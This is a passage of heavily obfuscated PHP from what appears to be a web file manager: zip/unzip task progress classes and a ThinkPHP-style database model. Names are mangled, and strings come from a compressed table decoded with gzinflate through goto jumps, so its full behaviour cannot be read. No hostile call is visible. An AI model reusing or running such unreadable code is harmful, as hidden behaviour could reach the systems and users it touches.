{ if ($–Ÿåãè¿ - $ªÁŸË˜[$´‹¨§ˆÀ[1795]] > $ªÁŸË˜[$´‹¨§ˆÀ[204]]) { $¨Üõ“›ç = !0; try { Hook::apply($ªÁŸË˜[$´‹¨§ˆÀ[317]], $ªÁŸË˜[$´‹¨§ˆÀ[1785]]); write_log($´‹¨§ˆÀ[1798] . $ÅÕ±©¡Ö . $´‹¨§ˆÀ[81] . $ªÁŸË˜[$´‹¨§ˆÀ[317]] . $´‹¨§ˆÀ[1799] . ACTION, $´‹¨§ˆÀ[195]); } catch (Exception $äÙ˜è‘™) { } continue; } $ç§’É©Æ[$ÅÕ±©¡Ö] = $ªÁŸË˜; } if (!$¨Üõ“›ç) { return; } if (!$ç§’É©Æ) { return Cache::remove($ÄóæßÍø); } Cache::set($ÄóæßÍø, $ç§’É©Æ, 60); Cache::removeMemory($ÄóæßÍø); } public static function finished($îÉóøæÊ, $ áøÉâ) { $ßõõŠ©ü =& $_SERVER[‚ûòÉ˜ş]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ßõõŠ©ü[317] => $îÉóøæÊ, $ßõõŠ©ü[1785] => $ áøÉâ); } private static function finishedRun() { $ö®İŠÁ =& $_SERVER[‚ûòÉ˜ş]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Å¶•ç¶) { try { Hook::apply($Å¶•ç¶[$ö®İŠÁ[317]], $Å¶•ç¶[$ö®İŠÁ[1785]]); } catch (Exception $¾‰¥½¤) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ì‹Œëı¢ =& $_SERVER[‚ûòÉ˜ş]; parent::startAfter(); Hook::bind($ì‹Œëı¢[1800], array($this, $ì‹Œëı¢[1801])); Hook::bind($ì‹Œëı¢[1234], array($this, $ì‹Œëı¢[1802])); Hook::bind($ì‹Œëı¢[1803], array($this, $ì‹Œëı¢[1804])); $Óã‹’» =& $this->task; $Óã‹’»[$ì‹Œëı¢[1805]] = $ì‹Œëı¢[1235]; if (!$Óã‹’»[$ì‹Œëı¢[1584]]) { $Óã‹’»[$ì‹Œëı¢[1584]] = LNG($ì‹Œëı¢[1806]); } } protected function endAfter() { $¤ÚŸ´é« =& $_SERVER[‚ûòÉ˜ş]; parent::endAfter(); Hook::unbind($¤ÚŸ´é«[1800], array($this, $¤ÚŸ´é«[1801])); Hook::unbind($¤ÚŸ´é«[1234], array($this, $¤ÚŸ´é«[1802])); Hook::unbind($¤ÚŸ´é«[1803], array($this, $¤ÚŸ´é«[1804])); } public function updateAfter() { $÷ÂĞµ¥ğ =& $_SERVER[‚ûòÉ˜ş]; $¿ÁÎ“²Ò =& $this->task; if (!$¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[826]] || !$¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[803]]) { if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1805]] != $÷ÂĞµ¥ğ[366]) { return; } } if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1805]] == $÷ÂĞµ¥ğ[1235]) { $Ïª¾À­æ = 0; if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1740]]) { $Ïª¾À­æ = $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1741]] / $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1740]]; } $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]] = $Ïª¾À­æ * 0.3; } else { if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1805]] == $÷ÂĞµ¥ğ[366]) { $Ïª¾À­æ = $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1688]] / $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[826]]; $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]] = 0.3 + $Ïª¾À­æ * 0.4; } else { if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1805]] == $÷ÂĞµ¥ğ[117]) { $í‚¡½È´ = 0; if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1742]] == $÷ÂĞµ¥ğ[117]) { $í‚¡½È´ = $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1741]]; } $Ïª¾À­æ = ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1745]] + $í‚¡½È´) / $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[803]]; $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]] = 0.3 + 0.4 + $Ïª¾À­æ * 0.3; } } } if ($¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]] > 0) { $˜ãİ’€ª = timeFloat() - $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1691]] - $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1694]]; $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1695]] = $˜ãİ’€ª * (1 - $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]]) / $¿ÁÎ“²Ò[$÷ÂĞµ¥ğ[1689]]; } } public function addFile($ìŠ¹‰ï¡) { $çæìÙ¤Ú =& $_SERVER[‚ûòÉ˜ş]; $¿ü›´Àò =& $this->task; $ÍÎ•°èŞ = IO::info($ìŠ¹‰ï¡); $¿ü›´Àò[$çæìÙ¤Ú[1738]] = $ÍÎ•°èŞ[$çæìÙ¤Ú[42]]; $¿ü›´Àò[$çæìÙ¤Ú[1740]] = $ÍÎ•°èŞ[$çæìÙ¤Ú[86]]; $¿ü›´Àò[$çæìÙ¤Ú[1741]] = 0; $¿ü›´Àò[$çæìÙ¤Ú[1105]] = $çæìÙ¤Ú[1761]; $¿ü›´Àò[$çæìÙ¤Ú[1742]] = $çæìÙ¤Ú[1235]; $¿ü›´Àò[$çæìÙ¤Ú[803]] = $ÍÎ•°èŞ[$çæìÙ¤Ú[86]]; $¿ü›´Àò[$çæìÙ¤Ú[826]] = 1; $Åú³ƒ›ø = 0; $¿ü›´Àò[$çæìÙ¤Ú[1749]] = array($çæìÙ¤Ú[1750] => $Åú³ƒ›ø + 1, $çæìÙ¤Ú[470] => $ÍÎ•°èŞ[$çæìÙ¤Ú[42]], $çæìÙ¤Ú[94] => $ÍÎ•°èŞ[$çæìÙ¤Ú[94]], $çæìÙ¤Ú[559] => $ÍÎ•°èŞ[$çæìÙ¤Ú[559]] ? $ÍÎ•°èŞ[$çæìÙ¤Ú[559]] : $ÍÎ•°èŞ[$çæìÙ¤Ú[94]]); $this->update(); } public function zipEvent($¶ÔËÄîó, $ÒœŞÛÃ, $ÃáİÛú—, $®àƒ¿Ğ) { $Œã¹ÎÓä =& $_SERVER[‚ûòÉ˜ş]; $Ñ¯œÒ´ =& $this->task; $Ñ¯œÒ´[$Œã¹ÎÓä[1738]] = get_path_this($ÒœŞÛÃ); $Ñ¯œÒ´[$Œã¹ÎÓä[1740]] = $®àƒ¿Ğ; $Ñ¯œÒ´[$Œã¹ÎÓä[1741]] = $ÃáİÛú—; $Ñ¯œÒ´[$Œã¹ÎÓä[1105]] = $¶ÔËÄîó == $Œã¹ÎÓä[1807] ? $Œã¹ÎÓä[1808] : $Œã¹ÎÓä[1809]; $Ñ¯œÒ´[$Œã¹ÎÓä[1742]] = $Œã¹ÎÓä[12]; $Ñ¯œÒ´[$Œã¹ÎÓä[803]] = $®àƒ¿Ğ; $Ñ¯œÒ´[$Œã¹ÎÓä[1805]] = $Œã¹ÎÓä[366]; $this->update(); } public function unzipAfter($¸­×Ã¥¢) { $±óÏ”˜ =& $_SERVER[‚ûòÉ˜ş]; $ĞˆõªİÁ =& $this->task; $ĞˆõªİÁ[$±óÏ”˜[1805]] = $±óÏ”˜[117]; $Ç¼ÖÏß = IO::infoWithChildren($¸­×Ã¥¢); $¿¥£õ¯ = 0; $ĞˆõªİÁ[$±óÏ”˜[1749]] = array($±óÏ”˜[1750] => $¿¥£õ¯ + 1, $±óÏ”˜[470] => $Ç¼ÖÏß[$±óÏ”˜[42]], $±óÏ”˜[94] => $Ç¼ÖÏß[$±óÏ”˜[94]], $±óÏ”˜[559] => $Ç¼ÖÏß[$±óÏ”˜[559]] ? $Ç¼ÖÏß[$±óÏ”˜[559]] : $Ç¼ÖÏß[$±óÏ”˜[94]]); if ($Ç¼ÖÏß[$±óÏ”˜[43]] == $±óÏ”˜[224]) { $ĞˆõªİÁ[$±óÏ”˜[826]] = 1; } else { $ĞˆõªİÁ[$±óÏ”˜[826]] = $Ç¼ÖÏß[$±óÏ”˜[89]][$±óÏ”˜[87]]; } $ĞˆõªİÁ[$±óÏ”˜[1105]] = $±óÏ”˜[12]; $ĞˆõªİÁ[$±óÏ”˜[1742]] = 0; $ĞˆõªİÁ[$±óÏ”˜[1688]] = 0; $ĞˆõªİÁ[$±óÏ”˜[1740]] = 0; $ĞˆõªİÁ[$±óÏ”˜[1741]] = 0; $ĞˆõªİÁ[$±óÏ”˜[1738]] = $±óÏ”˜[12]; $ĞˆõªİÁ[$±óÏ”˜[1745]] = 0; $ĞˆõªİÁ[$±óÏ”˜[803]] = $Ç¼ÖÏß[$±óÏ”˜[86]]; $this->update(); self::log($±óÏ”˜[1810] . json_encode(array($ĞˆõªİÁ, $Ç¼ÖÏß))); } public function nameParse($‹÷ÇËóş) { $…³İéÖ½ =& $_SERVER[‚ûòÉ˜ş]; $‘ÜÛãİ† =& $this->task; if ($‘ÜÛãİ†[$…³İéÖ½[1805]] == $…³İéÖ½[1235]) { $‘ÜÛãİ†[$…³İéÖ½[1805]] = $…³İéÖ½[366]; $‘ÜÛãİ†[$…³İéÖ½[1745]] = 0; $‘ÜÛãİ†[$…³İéÖ½[803]] = 0; } $¢øì¡•‹ = get_path_this($‹÷ÇËóş); if (strstr($¢øì¡•‹, $…³İéÖ½[10])) { $‘ÜÛãİ†[$…³İéÖ½[1688]] += 1; $‘ÜÛãİ†[$…³İéÖ½[826]] += 1; } $‘ÜÛãİ†[$…³İéÖ½[1738]] = $‹÷ÇËóş; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $‹“å¡§µ =& $_SERVER[‚ûòÉ˜ş]; parent::startAfter(); Hook::bind($‹“å¡§µ[1811], array($this, $‹“å¡§µ[1801])); Hook::bind($‹“å¡§µ[1803], array($this, $‹“å¡§µ[1804])); $‚Øì¥‰ =& $this->task; $‚Øì¥‰[$‹“å¡§µ[1805]] = $‹“å¡§µ[1235]; if (!$‚Øì¥‰[$‹“å¡§µ[1584]]) { $‚Øì¥‰[$‹“å¡§µ[1584]] = LNG($‹“å¡§µ[1812]); } } protected function endAfter() { $îº¿‹’ =& $_SERVER[‚ûòÉ˜ş]; parent::endAfter(); Hook::unbind($îº¿‹’[1811], array($this, $îº¿‹’[1801])); Hook::unbind($îº¿‹’[1803], array($this, $îº¿‹’[1804])); } public function updateAfter() { $ÆÒÃËÉ× =& $_SERVER[‚ûòÉ˜ş]; $£şà±ë =& $this->task; if (!$£şà±ë[$ÆÒÃËÉ×[826]] || !$£şà±ë[$ÆÒÃËÉ×[803]]) { return; } if ($£şà±ë[$ÆÒÃËÉ×[1805]] == $ÆÒÃËÉ×[1235]) { $¦¦ëõîí = $£şà±ë[$ÆÒÃËÉ×[1741]]; if ($£şà±ë[$ÆÒÃËÉ×[1742]] != $ÆÒÃËÉ×[1235]) { $¦¦ëõîí = 0; } $‹”œğó« = ($£şà±ë[$ÆÒÃËÉ×[1745]] + $¦¦ëõîí) / $£şà±ë[$ÆÒÃËÉ×[803]]; $£şà±ë[$ÆÒÃËÉ×[1689]] = $‹”œğó« * 0.3; } else { if ($£şà±ë[$ÆÒÃËÉ×[1805]] == $ÆÒÃËÉ×[366]) { $‹”œğó« = $£şà±ë[$ÆÒÃËÉ×[1688]] / $£şà±ë[$ÆÒÃËÉ×[826]]; $£şà±ë[$ÆÒÃËÉ×[1689]] = 0.3 + $‹”œğó« * 0.5; } else { if ($£şà±ë[$ÆÒÃËÉ×[1805]] == $ÆÒÃËÉ×[117]) { $‹”œğó« = 0; if ($£şà±ë[$ÆÒÃËÉ×[1740]]) { $‹”œğó« = $£şà±ë[$ÆÒÃËÉ×[1741]] / $£şà±ë[$ÆÒÃËÉ×[1740]]; } $£şà±ë[$ÆÒÃËÉ×[1689]] = 0.3 + 0.5 + $‹”œğó« * 0.2; } } } if ($£şà±ë[$ÆÒÃËÉ×[1689]] > 0) { $–Õ‹†ßÑ = timeFloat() - $£şà±ë[$ÆÒÃËÉ×[1691]] - $£şà±ë[$ÆÒÃËÉ×[1694]]; $£şà±ë[$ÆÒÃËÉ×[1695]] = $–Õ‹†ßÑ * (1 - $£şà±ë[$ÆÒÃËÉ×[1689]]) / $£şà±ë[$ÆÒÃËÉ×[1689]]; } } public function copyFileStart($¼ÆÈı•, $–ıØË•, $ü´üîÚÎ, $âÂ‰’Š´, $‡¦‘ô¤, $Ñù¥Ó€) { $Ä¶»µº =& $_SERVER[‚ûòÉ˜ş]; parent::copyFileStart($¼ÆÈı•, $–ıØË•, $ü´üîÚÎ, $âÂ‰’Š´, $‡¦‘ô¤, $Ñù¥Ó€); $ºçüÅœ‡ =& $this->task; if ($ºçüÅœ‡[$Ä¶»µº[1805]] == $Ä¶»µº[366]) { $ºçüÅœ‡[$Ä¶»µº[1805]] = $Ä¶»µº[117]; } $this->update(); } public function copyFileEnd($Ã¹ğ¹ıŒ, $¤á™³ö³, $íÑ–ƒœ¶, $®‰ñÛ«•, $‹ÌÒ“Ö, $ùìÑ¦×½) { $‹Í‰‘¸½ =& $_SERVER[‚ûòÉ˜ş]; $ØóŸñÒˆ =& $this->task; $ØóŸñÒˆ[$‹Í‰‘¸½[1741]] = $ØóŸñÒˆ[$‹Í‰‘¸½[1740]]; $ØóŸñÒˆ[$‹Í‰‘¸½[1745]] += $ØóŸñÒˆ[$‹Í‰‘¸½[1740]]; $ØóŸñÒˆ[$‹Í‰‘¸½[1742]] = $‹Í‰‘¸½[12]; $this->update(); } public function zipEvent($ò»ü ¹š, $´ƒÏóŞ, $ˆıéˆ•¨, $ÕĞõ¿ı„) { $Å¸ºÅ =& $_SERVER[‚ûòÉ˜ş]; $²¦÷ù‹° =& $this->task; $²¦÷ù‹°[$Å¸ºÅ[1738]] = get_path_this($´ƒÏóŞ); $²¦÷ù‹°[$Å¸ºÅ[1740]] = $ÕĞõ¿ı„; $²¦÷ù‹°[$Å¸ºÅ[1741]] = $ˆıéˆ•¨; $²¦÷ù‹°[$Å¸ºÅ[1105]] = $ò»ü ¹š == $Å¸ºÅ[1813] ? $Å¸ºÅ[1808] : $Å¸ºÅ[1809]; $²¦÷ù‹°[$Å¸ºÅ[1742]] = $Å¸ºÅ[12]; $²¦÷ù‹°[$Å¸ºÅ[803]] = $ÕĞõ¿ı„; $²¦÷ù‹°[$Å¸ºÅ[1805]] = $Å¸ºÅ[366]; $this->update(); } public function nameParse($Û»©æßË) { $ÃåÇº×¦ =& $_SERVER[‚ûòÉ˜ş]; $çşŒØ« =& $this->task; if ($çşŒØ«[$ÃåÇº×¦[1688]] < $çşŒØ«[$ÃåÇº×¦[826]]) { $îµ€Ş²Ê = get_path_this($Û»©æßË); if (strstr($îµ€Ş²Ê, $ÃåÇº×¦[10])) { $çşŒØ«[$ÃåÇº×¦[1688]] += 1; } } if ($çşŒØ«[$ÃåÇº×¦[1805]] == $ÃåÇº×¦[1235]) { $çşŒØ«[$ÃåÇº×¦[1805]] = $ÃåÇº×¦[366]; } $çşŒØ«[$ÃåÇº×¦[1738]] = $Û»©æßË; $this->update(); } } goto d»ùƒ¿‘«®; bôíŒ©Âƒ: if (!$giwmfpcquh) { die; } $_SERVER[ºï·Óû­] = explode($_SERVER[‚ûòÉ˜ş][657], gzinflate(substr($_SERVER[‚ûòÉ˜ş][658], 10, -8))); $xvpnwlerah = $_SERVER[‚ûòÉ˜ş][659]; goto bÜ…„™¶ÔÙ; a ‹î»ÀùÑ: define($_SERVER[‚ûòÉ˜ş][296], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\x72\144\x65\162", "\x61\x6c\151\141\x73", "\150\141\x76\151\156\x67", "\x67\x72\x6f\165\x70", "\154\157\143\153", "\x64\151\163\164\x69\156\143\164", "\141\165\x74\157", "\x66\151\x6c\164\x65\162", "\x76\x61\154\x69\144\x61\x74\145", "\x72\145\x73\165\154\164", "\x62\x69\x6e\144", "\164\157\x6b\145\156"); public function __construct($‰Ãõí‘” = '', $¸‘ğ¤˜® = '', $£Ş•”ö = '') { $ô¨é´³Š =& $_SERVER[‚ûòÉ˜ş]; $this->_initialize(); if (!empty($‰Ãõí‘”)) { if (strpos($‰Ãõí‘”, $ô¨é´³Š[10])) { list($this->dbName, $this->name) = explode($ô¨é´³Š[10], $‰Ãõí‘”); } else { $this->name = $‰Ãõí‘”; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¸‘ğ¤˜®)) { $this->tablePrefix = $ô¨é´³Š[12]; } elseif ($ô¨é´³Š[12] != $¸‘ğ¤˜®) { $this->tablePrefix = $¸‘ğ¤˜®; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ô¨é´³Š[297]); } $this->db(0, empty($this->connection) ? $£Ş•”ö : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¹„˜€§ï =& $_SERVER[‚ûòÉ˜ş]; if (empty($this->fields)) { if (think_config($¹„˜€§ï[298])) { $œÍû¤Ş = $this->dbName ? $this->dbName : think_config($¹„˜€§ï[299]); $ÔÖƒä»Ì = think_var_cache($¹„˜€§ï[300] . strtolower(get_path_this($œÍû¤Ş) . $¹„˜€§ï[10] . $this->name)); if ($ÔÖƒä»Ì) { $Â„ª©Íš = think_config($¹„˜€§ï[301]); if (empty($Â„ª©Íš) || $ÔÖƒä»Ì[$¹„˜€§ï[302]] == $Â„ª©Íš) { $this->fields = $ÔÖƒä»Ì; return; } } } $this->flush(); } } public function flush() { $Û·§¿òÜ =& $_SERVER[‚ûòÉ˜ş]; $this->db->setModel($this->name); $ªßÏ¸ÚÉ = $this->db->getFields($this->getTableName()); if (!$ªßÏ¸ÚÉ) { return !1; } $this->fields = array_keys($ªßÏ¸ÚÉ); $this->fields[$Û·§¿òÜ[303]] = !1; foreach ($ªßÏ¸ÚÉ as $Í ĞÙŒœ => $…Ä§ˆêú) { $÷´½÷µ[$Í ĞÙŒœ] = $…Ä§ˆêú[$Û·§¿òÜ[43]]; if ($…Ä§ˆêú[$Û·§¿òÜ[49]]) { $this->fields[$Û·§¿òÜ[304]] = $Í ĞÙŒœ; if ($…Ä§ˆêú[$Û·§¿òÜ[52]]) { $this->fields[$Û·§¿òÜ[303]] = !0; } } } $this->fields[$Û·§¿òÜ[305]] = $÷´½÷µ; if (think_config($Û·§¿òÜ[301])) { $this->fields[$Û·§¿òÜ[302]] = think_config($Û·§¿òÜ[301]); } if (think_config($Û·§¿òÜ[298])) { $”œğ– = $this->dbName ? $this->dbName : think_config($Û·§¿òÜ[299]); think_var_cache($Û·§¿òÜ[300] . strtolower(get_path_this($”œğ–) . $Û·§¿òÜ[10] . $this->name), $this->fields); } } public function switchModel($Øö¥Å°¾, $Ûèğû‚ = array()) { $­‘Áîšö =& $_SERVER[‚ûòÉ˜ş]; $Ù¼ˆ¨ Ï = ucwords(strtolower($Øö¥Å°¾)) . $­‘Áîšö[306]; if (!class_exists($Ù¼ˆ¨ Ï)) { think_exception($Ù¼ˆ¨ Ï . think_lang($­‘Áîšö[307])); } $this->_extModel = new $Ù¼ˆ¨ Ï($this->name); if (!empty($Ûèğû‚)) { foreach ($Ûèğû‚ as $ÇİÜÛ×Ú) { $this->_extModel->setProperty($ÇİÜÛ×Ú, $this->{$ÇİÜÛ×Ú}); } } return $this->_extModel; } public function __set($ßÚó…ê÷, $õ¹ÃÈô×) { $this->data[$ßÚó…ê÷] = $õ¹ÃÈô×; } public function __get($‚Ã‚’é) { return isset($this->data[$‚Ã‚’é]) ? $this->data[$‚Ã‚’é] : null; } public function __isset($ƒõ•œ§) { return isset($this->data[$ƒõ•œ§]); } public function __unset($ÍÖ™‚‹†) { unset($this->data[$ÍÖ™‚‹†]); } public function __call($¸Ü³¼ëä, $éñÆÜÜ§) { $ñâ³ıĞ =& $_SERVER[‚ûòÉ˜ş]; if (in_array(strtolower($¸Ü³¼ëä), $this->methods, !0)) { $this->options[strtolower($¸Ü³¼ëä)] = $éñÆÜÜ§[0]; return $this; } elseif (in_array(strtolower($¸Ü³¼ëä), array($ñâ³ıĞ[308], $ñâ³ıĞ[309], $ñâ³ıĞ[310], $ñâ³ıĞ[311], $ñâ³ıĞ[312]), !0)) { $Â¸£Ñ˜ş = isset($éñÆÜÜ§[0]) ? $éñÆÜÜ§[0] : $ñâ³ıĞ[213]; $Â¸£Ñ˜ş = $this->db->parseKey($Â¸£Ñ˜ş); return $this->getField(strtoupper($¸Ü³¼ëä) . $ñâ³ıĞ[313] . $Â¸£Ñ˜ş . $ñâ³ıĞ[314] . $¸Ü³¼ëä, $ñâ³ıĞ[308]); } elseif (strtolower(substr($¸Ü³¼ëä, 0, 5)) == $ñâ³ıĞ[315]) { $Â¸£Ñ˜ş = think_parse_name(substr($¸Ü³¼ëä, 5)); $˜ÑÀ–Ú©[$Â¸£Ñ˜ş] = $éñÆÜÜ§[0]; return $this->where($˜ÑÀ–Ú©)->find(); } elseif (strtolower(substr($¸Ü³¼ëä, 0, 10)) == $ñâ³ıĞ[316]) { $•¼ö‘é = think_parse_name(substr($¸Ü³¼ëä, 10)); $˜ÑÀ–Ú©[$•¼ö‘é] = $éñÆÜÜ§[0]; return $this->where($˜ÑÀ–Ú©)->getField($éñÆÜÜ§[1]); } elseif (isset($this->_scope[$¸Ü³¼ëä])) { return $this->scope($¸Ü³¼ëä, $éñÆÜÜ§[0]); } elseif (method_exists($this, $¸Ü³¼ëä)) { array_unshift($éñÆÜÜ§, $¸Ü³¼ëä); return call_user_func_array(array($this, $ñâ³ıĞ[317]), $éñÆÜÜ§); } else { return call_user_func_array(array(parent, $¸Ü³¼ëä), $éñÆÜÜ§); } } protected function call() { $·©ù²†” =& $_SERVER[‚ûòÉ˜ş]; $äÍÒËÌ = func_get_args(); $ÕÇÌ­ÉŞ = array_shift($äÍÒËÌ); $ùşíÊÎ = $ÕÇÌ­ÉŞ; if (is_array($ÕÇÌ­ÉŞ)) { $ùşíÊÎ = $ÕÇÌ­ÉŞ[1]; $ÕÇÌ­ÉŞ = $ÕÇÌ­ÉŞ[0]; } $¡ÊÖ²Áœ = count($äÍÒËÌ) - 1; if (isset($äÍÒËÌ[$¡ÊÖ²Áœ]) && $äÍÒËÌ[$¡ÊÖ²Áœ] === $ÕÇÌ­ÉŞ) { think_exception(__CLASS__ . $·©ù²†”[4] . $ÕÇÌ­ÉŞ . think_lang($·©ù²†”[318])); return; } $äÍÒËÌ[] = $ÕÇÌ­ÉŞ; if (method_exists($this, $·©ù²†”[319])) { $Èı©İÔ´ = call_user_func_array(array($this, $·©ù²†”[320]), array($ùşíÊÎ, $äÍÒËÌ)); if (!is_null($Èı©İÔ´) && $Èı©İÔ´ !== !1) { return $Èı©İÔ´; } } $Õ¿õÃÙ = call_user_func_array(array($this, $ÕÇÌ­ÉŞ), $äÍÒËÌ); if (method_exists($this, $·©ù²†”[321])) { $Èı©İÔ´ = call_user_func_array(array($this, $·©ù²†”[322]), array($ùşíÊÎ, $äÍÒËÌ, $Õ¿õÃÙ)); if ($Èı©İÔ´) { return $Èı©İÔ´; } } return $Õ¿õÃÙ; } protected function _initialize() { } protected function _facade($éÖù¯¢ˆ) { $ÜôŒ¹À© =& $_SERVER[‚ûòÉ˜ş]; if (!empty($this->fields)) { foreach ($éÖù¯¢ˆ as $¸ë©ıâğ => $Üî»‘òß) { if (is_array($this->fields) && !in_array($¸ë©ıâğ, $this->fields, !0)) { unset($éÖù¯¢ˆ[$¸ë©ıâğ]); } elseif (is_scalar($Üî»‘òß)) { $this->_parseType($éÖù¯¢ˆ, $¸ë©ıâğ); } } } if (!empty($this->options[$ÜôŒ¹À©[323]])) { $éÖù¯¢ˆ = array_map($this->options[$ÜôŒ¹À©[323]], $éÖù¯¢ˆ); unset($this->options[$ÜôŒ¹À©[323]]); } $this->_beforeWrite($éÖù¯¢ˆ); return $éÖù¯¢ˆ; } protected function _beforeWrite(&$Š±¾‚‰Ã) { } public function add($‚Ï··ç° = '', $ƒ•äğÈÁ = array(), $èåÇ´¸Ó = false) { if (empty($‚Ï··ç°)) { if (!empty($this->data)) { $‚Ï··ç° = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‚ûòÉ˜ş][324]); return !1; } } $ƒ•äğÈÁ = $this->_parseOptions($ƒ•äğÈÁ); $‚Ï··ç° = $this->_facade($‚Ï··ç°); if (!1 === $this->_beforeInsert($‚Ï··ç°, $ƒ•äğÈÁ)) { return !1; } $Ú«² §¸ = $this->db->insert($‚Ï··ç°, $ƒ•äğÈÁ, $èåÇ´¸Ó); if (!1 !== $Ú«² §¸) { $ñµ”µËê = $this->getLastInsID(); if ($ñµ”µËê) { $‚Ï··ç°[$this->getPk()] = $ñµ”µËê; $this->_after_insert($‚Ï··ç°, $ƒ•äğÈÁ); return $ñµ”µËê; } $this->_after_insert($‚Ï··ç°, $ƒ•äğÈÁ); } return $Ú«² §¸; } protected function _beforeInsert(&$ÌÆò†´š, $ó³î¸¢õ) { } protected function _after_insert($áôí¾˜ä, $« ıë²Ğ) { } public function addAll($ğ×Óš“, $â¼••…» = array(), $ºíä©ù“ = false) { $¨£ĞÊ‹ =& $_SERVER[‚ûòÉ˜ş]; if (empty($ğ×Óš“)) { $this->error = think_lang($¨£ĞÊ‹[324]); return !1; } $â¼••…» = $this->_parseOptions($â¼••…»); foreach ($ğ×Óš“ as $—ÕÖı¾À => $ú™ãõ´) { $ğ×Óš“[$—ÕÖı¾À] = $this->_facade($ú™ãõ´); } if (method_exists($this->db, $¨£ĞÊ‹[325])) { $Î©…ËÅÙ = $this->db->insertAll($ğ×Óš“, $â¼••…», $ºíä©ù“); } else { $this->startTrans(); foreach ($ğ×Óš“ as $—ÕÖı¾À => $ú™ãõ´) { $Î©…ËÅÙ = $this->db->insert($ú™ãõ´, $â¼••…», $ºíä©ù“); } $this->commit(); } if (!1 !== $Î©…ËÅÙ) { $û«Ğ©ÆÍ = $this->getLastInsID(); if ($û«Ğ©ÆÍ) { return $û«Ğ©ÆÍ; } } return $Î©…ËÅÙ; } public function selectAdd($¨‚«É¨– = '', $ÃÈµ¹µö = '', $Ë¡¬İ = array()) { $’¿û¼ã =& $_SERVER[‚ûòÉ˜ş]; $Ë¡¬İ = $this->_parseOptions($Ë¡¬İ); if (!1 === ($ÄÖÏàøİ = $this->db->selectInsert($¨‚«É¨– ? $¨‚«É¨– : $Ë¡¬İ[$’¿û¼ã[326]], $ÃÈµ¹µö ? $ÃÈµ¹µö : $this->getTableName(), $Ë¡¬İ))) { $this->error = think_lang($’¿û¼ã[327]); return !1; } else { return $ÄÖÏàøİ; } } public function save($Šìà†•„ = '', $ÅÆÚçß› = array()) { $—•€ºƒŸ =& $_SERVER[‚ûòÉ˜ş]; if (empty($Šìà†•„)) { if (!empty($this->data)) { $Šìà†•„ = $this->data; $this->data = array(); } else { $this->error = think_lang($—•€ºƒŸ[324]); return !1; } } $Šìà†•„ = $this->_facade($Šìà†•„); $ÅÆÚçß› = $this->_parseOptions($ÅÆÚçß›); $†¹Ï­õü = $this->getPk(); if (!isset($ÅÆÚçß›[$—•€ºƒŸ[328]])) { if (isset($Šìà†•„[$†¹Ï­õü])) { $¢Ø±â‘ç[$†¹Ï­õü] = $Šìà†•„[$†¹Ï­õü]; $ÅÆÚçß›[$—•€ºƒŸ[328]] = $¢Ø±â‘ç; unset($Šìà†•„[$†¹Ï­õü]); } else { $this->error = think_lang($—•€ºƒŸ[327]); return !1; } } if (is_array($ÅÆÚçß›[$—•€ºƒŸ[328]]) && isset($ÅÆÚçß›[$—•€ºƒŸ[328]][$†¹Ï­õü])) { $­Ãä¤¯ = $ÅÆÚçß›[$—•€ºƒŸ[328]][$†¹Ï­õü]; } if (!1 === $this->_beforeUpdate($Šìà†•„, $ÅÆÚçß›)) { return !1; } $ˆÈø˜µÖ = $this->db->update($Šìà†•„, $ÅÆÚçß›); if (!1 !== $ˆÈø˜µÖ) { if (isset($­Ãä¤¯)) { $Šìà†•„[$†¹Ï­õü] = $­Ãä¤¯; } $this->_afterUpdate($Šìà†•„, $ÅÆÚçß›); } return $ˆÈø˜µÖ; } protected function _beforeUpdate(&$’¿Ü™‰Ò, $÷¶¸·‹•) { } protected function _afterUpdate($ûÍñ‘£, $Ïé¶Ÿ) { } public function delete($ÏÆ³ĞöË = array()) { $µŞŒ‚’÷ =& $_SERVER[‚ûòÉ˜ş]; if (empty($ÏÆ³ĞöË) && empty($this->options[$µŞŒ‚’÷[328]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÖôÜ˜ = $this->getPk(); if (is_numeric($ÏÆ³ĞöË) || is_string($ÏÆ³ĞöË)) { if (strpos($ÏÆ³ĞöË, $µŞŒ‚’÷[60])) { $İš£âıÃ[$ÖôÜ˜] = array($µŞŒ‚’÷[329], $ÏÆ³ĞöË); } 